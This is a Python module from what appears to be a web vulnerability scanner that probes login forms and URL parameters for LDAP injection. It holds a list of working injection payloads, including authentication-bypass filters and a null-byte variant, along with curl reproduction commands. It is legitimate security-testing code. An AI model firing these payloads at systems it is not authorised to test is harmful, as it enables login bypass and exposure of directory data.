"""LDAP injection scanner — detect LDAP injection in login and search forms."""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_LDAP = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40_LDAP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
LDAP_PAYLOADS = [
    ("*", "wildcard star"),
    ("*)(uid=*))(|(uid=*", "authentication bypass"),
    ("admin)(&(password=*))", "admin bypass"),
    ("*))%00", "null byte termination"),
    (")(|(cn=*", "OR injection"),
    ("*)(|(objectClass=*", "object class enumeration"),
    ("admin)(|(password=*", "pass dump"),
    (")(uid=admin))(|(uid=", "classic auth bypass"),
]

ERROR_INDICATORS = [
    "ldap", "LDAP", "objectClass", "dn:", "cn=",
    "invalid dn syntax", "filter", "attribute",
    "javax.naming", "LDAPException", "SearchResult",
]

AUTH_BYPASS_INDICATORS = [
    "welcome", "logged in", "dashboard", "account", "profile",
    "logout", "home", "success",
]


class LdapInject(BaseModule):
    """LDAP injection scanner."""

    NAME        = "ldap_inject"
    DESCRIPTION = "Detect LDAP injection in login forms and search parameters"
    PHASE       = 4
    TAGS        = ["injection", "ldap", "auth", "cwe-90", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        forms = self.config.extra.get("found_forms", [])
        login_forms = [f for f in forms if any(
            kw in str(f).lower() for kw in ["login", "signin", "auth", "ldap", "user"]
        )]

        if not login_forms:
            login_forms = await self._find_login_forms(target)

        self.log.info("Testing %d form(s) for LDAP injection", len(login_forms))

        sem = asyncio.Semaphore(2)
        for form in login_forms[:5]:
            await self._test_form(form, target, sem)

        # Also test URL parameters
        for url in self.config.extra.get("crawled_urls", [])[:20]:
            if "?" in url and any(kw in url.lower() for kw in
                                   ["search", "query", "q=", "user=", "name=", "filter="]):
                await self._test_url(url, target)

        return self._make_result(start)

    async def _find_login_forms(self, target: str) -> list[dict]:
        try:
            import aiohttp
            for path in ["/login", "/signin", "/auth", "/admin", ""]:
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.get(
                        f"{target}{path}", timeout=aiohttp.ClientTimeout(total=8)
                    ) as resp:
                        html = await resp.text(errors="ignore")
                        # Simple form extraction
                        import re
                        forms = []
                        for fm in re.finditer(
                            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\']',
                            html, re.IGNORECASE
                        ):
                            inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html)
                            forms.append({
                                "url": f"{target}{path}",
                                "action": fm.group(1),
                                "method": fm.group(2).upper(),
                                "inputs": inputs,
                            })
                        if forms:
                            return forms
        except Exception:
            pass
        return []

    async def _test_form(self, form: dict, target: str, sem: asyncio.Semaphore) -> None:
        action = form["action"]
        if not action.startswith("http"):
            action = f"{target.rstrip('/')}/{action.lstrip('/')}"
        if not self.check_scope(action):
            return

        # Get baseline
        baseline = await self._post_form(action, {i: "testuser" for i in form.get("inputs", ["username", "password"])})
        if baseline is None:
            return

        for payload, label in LDAP_PAYLOADS:
            async with sem:
                await self.rate_limit()
                for input_name in form.get("inputs", ["username"]):
                    data = {i: "testuser" for i in form.get("inputs", ["username", "password"])}
                    data[input_name] = payload

                    result = await self._post_form(action, data)
                    if result is None:
                        continue

                    status, body = result

                    # Error-based detection
                    if any(ind in body for ind in ERROR_INDICATORS):
                        ev = Evidence(
                            request_raw=f"POST {action}\n{data}",
                            response_raw=body[:500],
                            extra={"payload": payload, "param": input_name},
                        )
                        self.new_finding(
                            title=f"LDAP Injection — Error-Based ({input_name} @ {action})",
                            severity=Severity.HIGH,
                            description=(
                                f"LDAP error triggered in parameter '{input_name}' at {action}. "
                                f"Payload: {payload}. "
                                "Server returned LDAP error details, confirming injection."
                            ),
                            reproduction_steps=[
                                f"curl -X POST {action} -d '{input_name}={payload}&password=test'",
                            ],
                            remediation=(
                                "Use parameterized LDAP queries (not string concatenation). "
                                "Escape all LDAP special characters: ( ) * \\ NUL"
                            ),
                            references=["CWE-90", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LDAP,
                            cvss_v40_vector=CVSS40_LDAP,
                            target=target,
                            url=action,
                        )
                        return

                    # Auth bypass detection
                    if (len(body) > len(str(baseline[1])) + 100 and
                        any(ind in body.lower() for ind in AUTH_BYPASS_INDICATORS)):
                        ev = Evidence(
                            request_raw=f"POST {action}\n{data}",
                            response_raw=body[:500],
                            extra={"payload": payload, "param": input_name, "label": label},
                        )
                        self.new_finding(
                            title=f"LDAP Authentication Bypass ({input_name} @ {action})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"LDAP authentication bypass via '{label}' payload in '{input_name}'. "
                                "Attacker may authenticate without valid credentials."
                            ),
                            reproduction_steps=[
                                f"Username: {payload}",
                                f"Password: anything",
                            ],
                            remediation="Use LDAP parameter binding; validate/escape all inputs.",
                            references=["CWE-90"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LDAP,
                            cvss_v40_vector=CVSS40_LDAP,
                            target=target,
                            url=action,
                        )
                        return

    async def _test_url(self, url: str, target: str) -> None:
        from urllib.parse import urlparse, parse_qs, urlencode
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            for payload, label in LDAP_PAYLOADS[:4]:
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=8)
                        ) as resp:
                            body = await resp.text(errors="ignore")
                    if any(ind in body for ind in ERROR_INDICATORS):
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:300],
                            extra={"payload": payload, "param": param_name},
                        )
                        self.new_finding(
                            title=f"LDAP Injection in URL Parameter — {param_name}",
                            severity=Severity.HIGH,
                            description=f"LDAP error via param '{param_name}' with payload '{payload}'",
                            reproduction_steps=[f"curl '{test_url}'"],
                            remediation="Escape LDAP special chars; use parameterized queries.",
                            references=["CWE-90"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LDAP,
                            cvss_v40_vector=CVSS40_LDAP,
                            target=target,
                            url=test_url,
                        )
                        return
                except Exception:
                    pass

    async def _post_form(self, url: str, data: dict):
        try:
            import aiohttp
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(ssl=False)
            ) as session:
                async with session.post(
                    url, data=data, timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=True,
                ) as resp:
                    body = await resp.text(errors="ignore")
                    return resp.status, body
        except Exception:
            return None


class TestLdapInject:
    def test_payloads_not_empty(self) -> None:
        assert len(LDAP_PAYLOADS) >= 4

    def test_error_indicators(self) -> None:
        body = "javax.naming.LDAPException: Invalid DN syntax"
        assert any(ind in body for ind in ERROR_INDICATORS)
